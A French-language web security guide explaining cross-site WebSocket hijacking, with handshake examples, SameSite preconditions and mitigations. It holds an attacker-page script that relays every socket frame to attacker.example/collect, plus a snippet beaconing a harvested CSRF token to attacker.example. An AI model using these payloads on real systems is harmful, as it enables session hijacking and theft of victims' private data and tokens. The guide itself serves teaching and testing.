---
order: 2
title: "Cross-site WebSocket hijacking"
description: "Un handshake WebSocket qui s'appuie sur les cookies ambiants et saute la validation d'Origin laisse une page attaquante ouvrir un socket authentifié au nom de la victime."
keywords:
  - cross-site WebSocket hijacking
  - CSWSH
  - validation d'Origin
  - cookies ambiants
  - CSRF WebSocket
---

# Cross-site WebSocket hijacking

Le handshake WebSocket est une requête HTTP ordinaire, et le navigateur y attache les cookies du site cible, sous réserve de l'attribut `SameSite` de chaque cookie (une précondition clé abordée sous la condition du handshake ci-dessous). Si le serveur autorise l'upgrade uniquement sur la base de ces cookies ambiants et ne valide pas l'en-tête `Origin`, alors toute page que la victime visite peut ouvrir un socket authentifié vers la cible en son nom. Contrairement à un CSRF basé sur un formulaire, la page de l'attaquant maintient le socket ouvert, ce qui lui permet à la fois de piloter des actions et de lire chaque trame que le serveur renvoie.

## La condition du handshake

La requête d'upgrade transporte le cookie de session et un `Origin` reflétant la page qui a ouvert le socket :

```http
GET /stream HTTP/1.1
Host: target.example
Upgrade: websocket
Connection: Upgrade
Origin: https://attacker.example
Cookie: session=1f3c...; auth=...
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Si le serveur répond `101 Switching Protocols` malgré l'`Origin` étranger, la connexion est détournable. Les handshakes WebSocket ne sont pas protégés par la same-origin policy pour l'ouverture elle-même, et `WebSocket` n'envoie ni ne requiert de jeton CSRF, donc l'authentification côté serveur repose sur le cookie.

La précondition cruciale est la manière dont ce cookie est délivré. Une ouverture WebSocket n'est pas une navigation de premier niveau, donc avec la valeur par défaut moderne `SameSite=Lax` le cookie de session n'est **pas** attaché à un handshake véritablement cross-site (par exemple `attacker.example` ouvrant un socket vers `target.example`). Le CSWSH requiert donc que le cookie d'authentification soit `SameSite=None`, ou que la page attaquante soit *same-site* avec la cible (un sous-domaine frère, puisque SameSite est délimité par le domaine enregistrable, pas par l'origine). Un cookie de session `SameSite=Lax`/`Strict` casse la délivrance ambiante et constitue en soi une mesure d'atténuation. Notez également que rejouer le handshake depuis un outil HTTP brut (en passant le cookie explicitement) contourne SameSite entièrement, donc un `101` là ne prouve pas à lui seul qu'un détournement cross-site *piloté par le navigateur* est viable ; confirmez aussi l'attribut SameSite du cookie.

## La page attaquante

L'exploit est une page que la victime est attirée à ouvrir alors qu'elle est connectée à la cible. Elle ouvre le socket, que le navigateur authentifie avec les cookies de la victime, puis exfiltre tout ce que le serveur diffuse en retour :

```html
<script>
const ws = new WebSocket('wss://target.example/stream');

ws.onopen = () => {
  // Drive the victim's session: request their data
  ws.send(JSON.stringify({ action: 'message.list', conversationId: 'self' }));
  ws.send(JSON.stringify({ action: 'account.profile' }));
};

ws.onmessage = (event) => {
  // Relay every frame to the attacker's collector
  fetch('https://attacker.example/collect', {
    method: 'POST',
    mode: 'no-cors',
    body: event.data
  });
};
</script>
```

Comme le socket s'exécute avec l'autorité de la victime, les réponses contiennent les conversations privées, le profil, les jetons de la victime, ou toute autre donnée que le flux expose. Le même canal pilote aussi des trames modifiant l'état, donc la page de l'attaquant peut publier des messages, changer des paramètres ou invoquer des actions en tant que victime.

## Récupération des secrets de session

Certaines applications envoient des données de bootstrap à la connexion, par exemple un jeton CSRF ou une clé d'API livrés dans la première trame afin que le client puisse les utiliser pour des appels REST ultérieurs. Un socket détourné reçoit cette trame de bootstrap directement :

```javascript
ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  if (msg.csrfToken) {
    navigator.sendBeacon('https://attacker.example/token', msg.csrfToken);
  }
};
```

Récolter ce jeton fait monter en puissance le détournement : l'attaquant détient désormais une valeur qui déverrouille aussi la surface REST ordinaire protégée par CSRF.

## Confirmer la faiblesse

Rejouez un handshake capturé avec l'en-tête `Origin` retiré, puis avec une valeur étrangère arbitraire, et guettez la réponse `101` dans chaque cas. Un serveur qui upgrade lorsque `Origin` est absent ou étranger, tout en attachant quand même la session, est ouvert au détournement. Un socket qui transporte un jeton non devinable dans l'URL ou dans une valeur de sous-protocole, plutôt que de s'appuyer sur les cookies, ne présente pas le même comportement.

## Outils

- **Burp Suite** : capturer le handshake, puis le rejouer avec l'`Origin` retiré ou défini sur une valeur étrangère.
- **Page HTML attaquante confectionnée** : un script `WebSocket` qui ouvre le socket et exfiltre les trames renvoyées.
- **websocat** : rejouer le handshake en ligne de commande pour confirmer le comportement d'upgrade.

## Références

- PortSwigger Web Security Academy, "Cross-site WebSocket hijacking"
- OWASP, "Cross Site WebSocket Hijacking (CSWSH)"
